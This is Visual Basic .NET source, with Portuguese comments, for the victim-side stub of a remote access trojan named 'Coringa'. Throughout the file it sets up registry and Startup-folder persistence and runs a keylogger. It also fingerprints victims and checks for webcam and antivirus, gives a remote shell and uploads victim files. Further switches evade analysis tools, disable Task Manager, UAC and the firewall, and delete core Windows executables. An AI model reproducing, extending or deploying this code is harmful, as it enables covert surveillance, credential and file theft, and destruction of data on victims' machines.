Imports System.Collections.Generic
Imports System.Threading
Imports System.IO.Compression
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Text
Imports System.Security.Principal
Imports Microsoft.Win32
Imports System.Net
Imports System.Reflection
Imports System.Globalization
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Security
Imports System.Net.NetworkInformation
Imports System.ServiceProcess

Public Class SooftT

#Region "Configurações"

    Public NomeDaVitima As String = "%NomeVitimas%"
    Public VersaoCoringa As String = "0.3"



    Public MTX As String = ""
    Public MT As Mutex = Nothing



    Public EXE As String = "%exe%"
    Public DR As String = "%dir%"




    Public NomeDaChaveMutex As String = "%MinhaChaveMutex%"



    Public ListHosts As String = "%host%"
    Public ListPortas As String = "%port%"

    Public AtivarMensagem As String = "%AtivarrMensagem%"
    Public TituloDaMensagem As String = "%TitulooDaMensagem%"
    Public TextoDaMensagem As String = "%TextoDaMensagemm%"
    Public TipoDeIconesMensagem As String = "%IconMensagemms%"
    Public TipoDeButaoMensagem As String = "%ButaoMensagemms%"
    Public OutroTipoDeMensagem As String = "%OutroTipoDeMensagemsss%"




    Public AtivarListaSites As String = "%AtivarListSites%"
    Public ListaSites As String = "%ListSites%"





    Public ASitemsProcess As String = "%AntiSytemProcess%"
    Public ASbieCtrl As String = "%AntiSbieCtrl%"
    Public ASpyTheSpy As String = "%AntiSpyTheSpy%"
    Public Awireshark As String = "%AntiWireshark%"
    Public AapateDNS As String = "%AntiapateDNS%"
    Public AIPBlocker As String = "%AntiIPBlocker%"
    Public ATiGeR_Firewall As String = "%AntiTiGeR_Firewall%"
    Public Asmsniff As String = "%Antismsniff%"
    Public AexeinfoPE As String = "%AntiexeinfoPE%"
    Public ANetSnifferCs As String = "%AntiNetSnifferCs%"
    Public ASandboxie_Control As String = "%AntiSandboxie_Control%"
    Public Aprocesshacker As String = "%Antiprocesshacker%"
    Public AGerenciador As String = "%AntiGerenciador%"
    Public AMsconfig As String = "%AntiMsconfig%"
    Public AdnSpy As String = "%AntidnSpy%"
    Public ACodeReflect As String = "%AntiCodeReflect%"
    Public AReflector As String = "%AntiReflector%"
    Public AILSpy As String = "%AntiILSpy%"

    Public AtivarDelay As String = "%AtivarDelay%"
    Public TextoDelay As String = "%TexxtoDelay%"
    Public AtivarEncryptHost As String = "%EncryptarrHost%"

    Public AtivarExcluirArquivo As String = "%ExcluirArquivoMelt%"
    '=============================================================================
    Public AtivarChaveHKEY_USER As String = "%ChaveHKEY_CURRENT_USER%"
    Public NomeDaChaveHKEY_USER As String = "%NomeChaveHKEY_USER%"
    Public AtivarChaveRUN1 As String = "%ChaveHKEY_CURRENT_USER_RUN1%"
    Public NomeDaChaveRUN1 As String = "%NomeChaveHKEY_USER_RUN1%"
    '==============================================================================
    Public AtivarChaveHKEY_MACHINE As String = "%ChaveHKEY_LOCAL_MACHINE%"
    Public NomeDaChaveHKEY_MACHINE As String = "%NomeChaveHKEY_MACHINE%"
    Public AtivarChaveRUN2 As String = "%ChaveHKEY_MACHINE_RUN2%"
    Public NomeDaChaveRUN2 As String = "%NomeChaveHKEY_MACHINE_RUN2%"
    '==============================================================================



    Public NomePastaFile As String = "%NomeDaPastaa%"




    Public OcutarServidor As String = "%OcutarServidorr%"

    Public AtivarStartUp As String = "%AtivaaarStartUp%"
    Public NomeStartUp As String = "%NomeDoArquivoStartUp%"

    Public AtivarBypassFirewall As String = "%BypassFirewallWindows%"




    Public IDDoMeuGrupo As String = "%BBIDGrupoo%"
    Public NomeDoMeuGrupo As String = "%BBNomeGrupoo%"


    











    Public AtivarSpreadDiscoLocal As String = "%SpreadDiscoLocal%"
    Public NomeSpreadDiscoLocal As String = "%TextoSpreadDiscoLocal%"

    Public AtivarAgendarServidor As String = "%AgenndarServidor%"

    Public Y As String = "|Coringa|"

    Public AtivarProcessProtectWithBSOD As String = "%ProtectProcessBSOD%"

    Public ADesativarGerenciadorDeTarefas As String = "%DesativarGerenciadorDeTarefass%"
    Public ADesativarCMD As String = "%DesativarCMDD%"
    Public ADesativarRegedit As String = "%DesativarRegeditT%"
    Public ADesativarExecutar As String = "%DesativarExecutarR%"
    Public ADesativarUAC As String = "%DesativarUACC%"
    Public ADesativarPainelDeControle As String = "%DesativarPainelDeControleE%"
    Public ADesativarOpçõesDePasta As String = "%DesativarOpçõesDePastaA%"
    Public ADesativarMenuContexto As String = "%DesativarMenuContextoO%"
    Public ADesativarBarraDeTarefas As String = "%DesativarBarraDeTarefasS%"
    Public ADesativarFirewall As String = "%DesativarFirewallL%"

    Public PermisaoAdmin As String = "%AdminPermisao%"

    Public MinhaCorTexto As String = "%MinhaCorrText%"







    Dim NomeDaChaveRegistro As String = "Software\Microsoft\Windows\CurrentVersion\Run"
    Dim NomeDaChaveRUN As String = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"

#End Region

    'REMOTE DESKTOP===========================================================================================
    Public cap As New CRDP
    Public caa As New CRDP1
    '==========================================================================================================


    Public Sub CriarChaveHKEYUSER(ByVal Nome As String, ByVal CaminhoExE As String, ByVal Escolher As String)
        Try
            'CRIAR CHAVE NA HKEY_CURRENT_USER
            If Escolher = "1" Then
                Registry.CurrentUser.CreateSubKey((NomeDaChaveRegistro)).SetValue(Nome, CaminhoExE)
                'CRIAR CHAVE NA HKEY_CURRENT_USER, Policies
            ElseIf Escolher = "2" Then
                Registry.CurrentUser.CreateSubKey((NomeDaChaveRUN)).SetValue(Nome, CaminhoExE)
                '============================================================================================
                'CRIAR CHAVE NA HKEY_LOCAL_MACHINE
            ElseIf Escolher = "3" Then
                Registry.LocalMachine.CreateSubKey((NomeDaChaveRegistro)).SetValue(Nome, CaminhoExE)
                'CRIAR CHAVE NA HKEY_LOCAL_MACHINE, Policies
            ElseIf Escolher = "4" Then
                Registry.LocalMachine.CreateSubKey((NomeDaChaveRUN)).SetValue(Nome, CaminhoExE)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub




    Public Sub WL()
        'ESSA SUB VAI FICA EM LOOP





        MTX = NomeDaChaveMutex


        If Command() IsNot Nothing Then

            If Command.Length > 0 Then
                Dim a = Split(Command, ":")
                Select Case a(0)

                    Case "UP"
                        Try
                            F.Registry.CurrentUser.SetValue("di", "!")
                        Catch ex As Exception

                        End Try
                        Try
                            Dim p As Object = Process.GetProcessById(CType(a(1), Integer))
                            p.WaitForExit(5000)
                            Try
                                p.Dispose()
                            Catch ex As Exception

                            End Try
                        Catch ex As Exception
                            Thread.Sleep(5000)
                        End Try

                    Case ".."
                        Thread.Sleep(5000)

                End Select
            End If
        End If



        'INICIAR INSTALAÇÃO DO SERVIDOR
        Instalar_Servidor()





        Try
            For Each x In Process.GetProcesses
                Try

                    If CompDir(New IO.FileInfo(x.MainModule.FileName), LO) Then
                        If x.Id > Process.GetCurrentProcess.Id Then
                            End
                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        Catch ex As Exception

        End Try



        Try
            Mutex.OpenExisting(MTX)
            End
        Catch ex As Exception

        End Try




        Try
            MT = New Mutex(True, MTX)
        Catch ex As Exception
            End
        End Try



        'MINHA CONEXÃO
        Dim tt As Object = New Thread(AddressOf Minha_Conexao, 1)
        tt.Start()












        '=====================================================

        'ATIVA KEYLOGGER
        Try
            kq = New kl
            tt = New Thread(AddressOf kq.WRK, 1)
            tt.Start()
        Catch ex As Exception

        End Try




        Dim ac As Integer = 0
        Dim su As Integer = 0
        Dim ov As String = ""


        'VERIFICAR DE TA ATIVADO "Process Protect With BSOD"
        If AtivarProcessProtectWithBSOD = "True" Then
            Try
                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf ED
                pr(1)
            Catch ex As Exception

            End Try
        End If

        While True
            Thread.Sleep(1000)
            Try
                ac += 1
                su += 1
                If ac = 5 Then
                    Try
                        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
                    Catch ex As Exception
                    End Try
                End If
                If ac > 10 Then
                    ac = 0
                    If Cn = True Then
                        If ACT() = ov Then
                        Else
                            ov = ACT()
                            If ov IsNot Nothing Then
                                If ov.Length > 0 Then
                                    Send("act" & Y & ov)
                                End If
                            End If
                        End If
                    End If
                End If
                If su > 7 Then
                    su = 0

                    'CRIAR CHAVE NA HKEY_CURRENT_USER
                    Try
                        If AtivarChaveHKEY_USER = "True" Then
                            CriarChaveHKEYUSER(NomeDaChaveHKEY_USER, LO.FullName, "1")
                        End If
                    Catch ex As Exception

                    End Try

                    'CRIAR CHAVE NA HKEY_CURRENT_USER,Policies
                    Try
                        If AtivarChaveRUN1 = "True" Then
                            CriarChaveHKEYUSER(NomeDaChaveRUN1, LO.FullName, "2")
                        End If
                    Catch ex As Exception

                    End Try

                    'CRIAR CHAVE NA HKEY_LOCAL_MACHINE
                    Try
                        If AtivarChaveHKEY_MACHINE = "True" Then
                            CriarChaveHKEYUSER(NomeDaChaveHKEY_MACHINE, LO.FullName, "3")
                        End If
                    Catch ex As Exception

                    End Try

                    'CRIAR CHAVE NA HKEY_LOCAL_MACHINE,Policies
                    Try
                        If AtivarChaveRUN2 = "True" Then
                            CriarChaveHKEYUSER(NomeDaChaveRUN2, LO.FullName, "4")
                        End If
                    Catch ex As Exception

                    End Try

                    'COPIAR PARA "StartUp"
                    If AtivarStartUp = "True" Then
                        Try
                            File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe", True)
                        Catch ex As Exception

                        End Try
                    End If

                End If
            Catch ex As Exception

            End Try

        End While
    End Sub

    Public Sub DLV(ByVal n As String)
        Try
            F.Registry.CurrentUser.CreateSubKey("Software\" & NomeDaChaveMutex).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Sub

    Function GTV(ByVal Nome As String) As String
        Try
            Return F.Registry.CurrentUser.CreateSubKey("Software\" & NomeDaChaveMutex).GetValue(Nome, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Function STV(ByVal n As String, ByVal t As String)
        Try
            F.Registry.CurrentUser.CreateSubKey("Software\" & NomeDaChaveMutex).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function


    'INFORMAÇÕES DO COMPUTADOR=========================================================================================================================================================================================
    Public Function Get_MinhasInformações() As String

        Dim s As String = "lv" & Y 'FUNÇÃO "lv"

        Try
            s += ENB(DEB(NomeDaVitima) & "_" & HWD()) & Y 'NOME DA VITIMA
        Catch ex As Exception
            Dim R As New Random
            Dim number As Integer = R.Next(1, 1000000)
            Dim digits As String = number.ToString("0000000")
            s += ENB(DEB(NomeDaVitima) & "_" & digits) & Y
        End Try

        Try
            s += Environment.MachineName & Y 'PC
        Catch ex As Exception
            s += "-" & Y
        End Try

        Try
            s += Environment.UserName & Y 'USUÁRIO
        Catch ex As Exception
            s += "-" & Y
        End Try

        s += DataDeInstalacao() & Y 'DATA DE INSTALAÇÃO

        Try
            s += Gcc(&H7) & Y 'PAÍS
        Catch ex As Exception
            s += "X" & Y
        End Try

        Try
            s += My.Computer.Info.OSFullName & " " & Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").ToString & Y 'VERSÃO DO WINDOWS
        Catch ex As Exception
            s += "-" & Y
        End Try

        Try
            If Cam() = True Then 'WEBCAM
                s += "Sim" & Y
            Else
                s += "Não" & Y
            End If
        Catch ex As Exception
            s += "-" & Y
        End Try

        s += VersaoCoringa & Y 'VERSÃO DO CORINGA

        s += "27ms" & Y 'PING

        s += ACT() & Y 'JANELAS ATIVAS

        s += MinhaCorTexto & Y 'MINHA COR DO TEXTO

        s += IDDoMeuGrupo & Y 'ID DO GRUPO

        s += NomeDoMeuGrupo & Y 'NOME DO GRUPO

        Return s

    End Function
    '================================================================================================================================================================================================================================================

    'DATA DE INSTALAÇÃO=============================================================================================================================================================================================================================================================================
    Public Function DataDeInstalacao() As String
        Try
            Return CType(LO, IO.FileInfo).LastWriteTime.ToString("dd-MM-yyyy")
        Catch ex As Exception
            Return "00-00-0000"
        End Try
    End Function
    '==========================================================================================================================================================================================================================================================================

    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function

    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function

    Function RN(ByVal c As Integer) As String
        Randomize()
        Dim r As New Random
        Dim s As String = ""
        Dim k As String = "abcdefghijklmnopqrstuvwxyz"
        For i As Integer = 1 To c
            s += k(r.Next(0, k.Length))
        Next
        Return s
    End Function

    Public Function SB(ByRef S As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(S)
    End Function

    Public Function BS(ByRef B As Byte()) As String
        Return System.Text.Encoding.Default.GetString(B)
    End Function

    Public SPL As String = "[endof]"

    Function fx(ByVal b As Byte(), ByVal spl As String) As Array
        Dim a As Object = New List(Of Byte())
        Dim M As Object = New IO.MemoryStream
        Dim MM As Object = New IO.MemoryStream
        Dim T As String() = Split(BS(b), spl)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + spl.Length, b.Length - (T(0).Length + spl.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Public Function ZIP(ByVal B() As Byte, ByRef CM As Boolean) As Byte()
        If CM = True Then
            Dim M As Object = New IO.MemoryStream()
            Dim gZip As Object = New IO.Compression.GZipStream(M, CompressionMode.Compress, True)
            gZip.Write(B, 0, B.Length)
            gZip.Dispose()
            M.Position = 0
            Dim BF(M.Length) As Byte
            M.Read(BF, 0, BF.Length)
            M.Dispose()
            Return BF
        Else
            Dim M As Object = New IO.MemoryStream(B)
            Dim gZip As Object = New GZipStream(M, CompressionMode.Decompress)
            Dim buffer(3) As Byte
            M.Position = M.Length - 5
            M.Read(buffer, 0, 4)
            Dim size As Integer = BitConverter.ToInt32(buffer, 0)
            M.Position = 0
            Dim BF(size - 1) As Byte
            gZip.Read(BF, 0, size)
            gZip.Dispose()
            M.Dispose()
            Return BF
        End If
    End Function




#Region "API"
    <DllImport("psapi")> _
    Public Shared Function EmptyWorkingSet(ByVal hProcess As Long) As Boolean
    End Function
    '======== Process Protect With BSOD
    <DllImport("ntdll")> _
    Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    '=============================== Cam Drivers
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function
    '=============================== PC País
    <DllImport("kernel32.dll")> _
    Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Public Function Gcc(ByVal i As UInteger) As String
        Try
            Dim lpLCData = New System.Text.StringBuilder(256)
            Dim ret As Integer = GetLocaleInfo(&H400, i, lpLCData, lpLCData.Capacity)
            If ret > 0 Then
                Return lpLCData.ToString().Substring(0, ret - 1)
            End If
        Catch ex As Exception

        End Try

        Return "X"
    End Function
    '====================================== Window API
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ENB(" ")
                Exit Function
            End If
            Dim t As Integer
            t = GetWindowTextLength(h)
            Dim w As String = StrDup(t + 1, "*")
            GetWindowText(h, w, t + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return ENB(w)
            Else
                Try
                    Return ENB(Diagnostics.Process.GetProcessById(pid).MainWindowTitle())
                Catch ex As Exception
                    Return ENB(w)
                End Try
            End If
        Catch ex As Exception
            Return ENB(" ")
        End Try
    End Function
    '=================== Get Drive Serial
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
#End Region

    Shared Sub Main()

        Dim c As New SooftT

        'VERIFICA SE ESTA ATIVADO A OPÇÃO FORNECE PERMISÃO DE ADMINISTRADOR
        If c.PermisaoAdmin = "True" Then
            Try
                Dim mPrincipal As WindowsPrincipal = New WindowsPrincipal(WindowsIdentity.GetCurrent)
                If mPrincipal.IsInRole(WindowsBuiltInRole.Administrator) = False Then
                    MessageBox.Show("E Preciso Executar Como Administrador Para Iniciar o Software", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                    End
                End If
            Catch ex As Exception

            End Try
        End If

        'VERIFICAR SE ESTA ATIVADO O DELAY
        If c.AtivarDelay = "True" Then
            Dim PARADA As New Stopwatch
            PARADA.Start()
            Do While PARADA.ElapsedMilliseconds < c.TextoDelay * 1000
                Application.DoEvents()
            Loop
            PARADA.Stop()
        End If

        'VERIFICAR SE ESTA ATIVADO O ECNRYPT DO HOST
        If c.AtivarEncryptHost = "True" Then
            c.ListHosts = c.DEB(c.ListHosts)
        End If

        'INICIAR A INSTALAÇÃO DO SERVIDOR
        c.WL()

    End Sub

    'Private Shared Function MinhaCoo(ByVal sText As String) As String
    '    Dim i As Long
    '    Dim rt As String = Nothing
    '    For i = 1 To Len(sText)
    '        rt = rt & Chr(Asc(Mid(sText, i, 1)) - 1)
    '    Next
    '    Return rt
    'End Function
    

    '======================================================================================================================================

    Private Sub ED()
        pr(0)
    End Sub

    Public kq As kl = Nothing

    Function Plugin(ByVal ByteOfPlugin As Byte(), ByVal ClassName As String) As Object

        Dim J As Object = Reflection.Assembly.Load(ByteOfPlugin)
        Try
        Catch ex As Exception
        End Try
        Return J.CreateInstance(Split(J.FullName, ",")(0) & "." & ClassName)
    End Function

    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)

#Region "remote Shell"

    Private Sub RS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
        Try
            Send("rs" & Y & ENB(e.Data))
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ex()
        Try
            Send("rsc")
        Catch ex As Exception

        End Try
    End Sub

    Private Pro As Object

#End Region

    'API ESCONDE,MOSTRAR BARRA DE TAREFAS====================================================================
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Public Const SWP_HIDEWINDOW = &H80
    Public Const SWP_SHOWWINDOW = &H40
    '============================================================================

    'API MONITOR ON/OFF============================================================================
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    '===================================================================================

    'API TROCA WALLPAPER===================================================================================
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SPI_SETDESKWALLPAPER = 20
    Private Const SPIF_UPDATEINIFILE = &H1
    '==================================================================================================

    'VERIFICAR TAMANHO DO TEXTO DA MEMORIA=====================================================================================
    Function SetBytes(Bytes) As String
        On Error GoTo hell
        If Bytes >= 1073741824 Then
            SetBytes = Format(Bytes / 1024 / 1024 / 1024, "#0.00") & " GB"
        ElseIf Bytes >= 1048576 Then
            SetBytes = Format(Bytes / 1024 / 1024, "#0.00") & " MB"
        ElseIf Bytes >= 1024 Then
            SetBytes = Format(Bytes / 1024, "#0.00") & " KB"
        ElseIf Bytes < 1024 Then
            SetBytes = Fix(Bytes) & " KB"
        End If
        Exit Function
hell:
        SetBytes = "0,00 KB"
    End Function
    '==================================================================================================================================

    'ENVIAR NOME DO MEU IDIOMA==========================================================================================================================================================
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    '========================================================================================================================================================================

    'ENVIAR NOME DO MEU ANTI VIRUS==========================================================================================================================================================
    Shared Function GetAntiVirus() As String
        Dim Nome As Object = "Select * From AntiVirusProduct"
        Dim NomeChave As Object = GetObject("winmgmts:\\.\root\SecurityCenter2")
        Dim Nomey As Object = NomeChave.ExecQuery(Nome)
        For Each eeaR As Object In Nomey
            On Error Resume Next
            Return eeaR.displayName.ToString() & "|Coringa|"
        Next
        Return "Não foi Possível Detectar AV" & "|Coringa|"
    End Function
    '============================================================================================================================================================================

    'API SUSPENDER, RESUME PROCESSO==================================================================================================================================================
    <DllImport("NTDLL")> _
    Public Shared Function NtSuspendProcess(ByVal hProc As IntPtr) As IntPtr
    End Function
    <DllImport("NTDLL")> _
    Public Shared Function NtResumeProcess(ByVal hProc As IntPtr) As IntPtr
    End Function
    '=======================================================================================================================================================================================================

    'GERENCIADOR DE ARQUIVOS=========================================================================================================================================================================================
    Public Function GetPastas(ByVal location) As String
        Try
            Dim di As New DirectoryInfo(location)
            Dim folders = ""
            For Each subdi As DirectoryInfo In di.GetDirectories
                folders += "%DIRET%" & "%|%" & subdi.Name & "%|%" & vbNewLine
            Next
            Return folders
        Catch ex As Exception

        End Try
    End Function
    Public Function GetArquivos(ByVal location) As String
        Try
            Dim dir As New System.IO.DirectoryInfo(location)
            Dim files = ""
            For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
                files += "%FILESS%" & "%|%" & f.Name & "%|%" & f.Length.ToString & "%|%" & vbNewLine
            Next
            Return files
        Catch ex As Exception

        End Try
    End Function
    Public Function GetDiscos() As String
        Try
            Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
            Dim d As DriveInfo
            Dim stResult As String
            For Each d In allDrives
                If d.IsReady = True Then
                    stResult += "%DIISC%" & "%|%" & d.Name & "%|%" & d.TotalSize.ToString & "%|%" & vbNewLine
                End If
            Next
            Return stResult
        Catch ex As Exception

        End Try
    End Function

    Public Function BaixaArquivo(ByVal LocalFile As String) As String
        Try
            Dim a As String
            a += Path.GetFileName(LocalFile) & "%||%"
            a += My.Computer.FileSystem.GetFileInfo(LocalFile).Length.ToString & "%||%"
            a += Convert.ToBase64String(IO.File.ReadAllBytes(LocalFile)) & "%||%"
            a += LocalFile & "%||%" & vbNewLine
            Return a
        Catch ex As Exception

        End Try
    End Function
    '==================================================================================================================================================================================

    'MEU NOME==============================================================================================================================================================================
    Public Function MeuNome() As String
        Dim n As String
        n = Environment.MachineName & "\" & Environment.UserName & Y
        Return n
    End Function
    '=======================================================================================================================================================================================

    
    'TESTECOMPRESS
    Public Shared Function smethod_8(ByVal byte_0 As Byte(), ByRef bool_0 As Boolean) As Byte()
        If bool_0 Then
            Dim stream As New MemoryStream
            Dim stream2 As New GZipStream(stream, CompressionMode.Compress, True)
            stream2.Write(byte_0, 0, byte_0.Length)
            stream2.Dispose()
            stream.Position = 0
            Dim buffer As Byte() = New Byte((CInt(stream.Length) + 1) - 1) {}
            stream.Read(buffer, 0, buffer.Length)
            stream.Dispose()
            Return buffer
        End If
        Dim stream3 As New MemoryStream(byte_0)
        Dim stream4 As New GZipStream(stream3, CompressionMode.Decompress)
        Dim buffer2 As Byte() = New Byte(4 - 1) {}
        stream3.Position = (stream3.Length - 5)
        stream3.Read(buffer2, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
        stream3.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        stream4.Read(array, 0, count)
        stream4.Dispose()
        stream3.Dispose()
        Return array
    End Function



    Public Shared Function smethod_11(ByRef string_0 As String) As Byte()
        Return Encoding.Default.GetBytes(string_0)
    End Function




    Sub Ind(ByVal b As Byte())

        Dim A As String() = Split(BS(b), Y)

        Try

            Select Case A(0)

                Case "BlocKPage"

                    My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", vbNewLine & "127.0.0.1 " + A(1), True)

                Case "Restart"

                    Shell("shutdown -r -t 00", AppWinStyle.Hide)

                Case "Shutdown"

                    Shell("shutdown -s -t 00", AppWinStyle.Hide)

                Case "OpenPage"

                    Process.Start(A(1))



                    'FORMATAR COMPUTADOR==============================================================================================================================================================================================
                Case "del"
                    Try
                        Dim N As String = "C:\Windows\explorer.exe|C:\Windows\regedit.exe|C:\Windows\System32\taskmgr.exe|C:\Windows\System32\cmd.exe|"
                        Dim S As String() = Split(N, "|")
                        For Each U In S
                            Application.DoEvents()
                            If File.Exists(U) Then
                                File.Delete(U)
                            End If
                        Next
                    Catch ex As Exception

                    End Try
                    '======================================================================================================================================================================================================================










                    'GERENCIADOR DE ARQUIVOS=========================================================================================================================================

                Case "PermisaoGerenciadorMineee"

                    Send("ChamaFrmGerenciadorr" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "|DiscosG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetDiscos()
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y)

                Case "|DesktopG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & Y)

                Case "|ArProgramasG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & Y)

                Case "|DocumentosG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & Y)

                Case "|DownloadsG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas("C:\Users\" & Environment.UserName & "\Downloads")
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos("C:\Users\" & Environment.UserName & "\Downloads")
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & "C:\Users\" & Environment.UserName & "\Downloads" & Y)

                Case "|ImagensG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) & Y)

                Case "|MusicasG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) & Y)

                Case "|VideosG|"
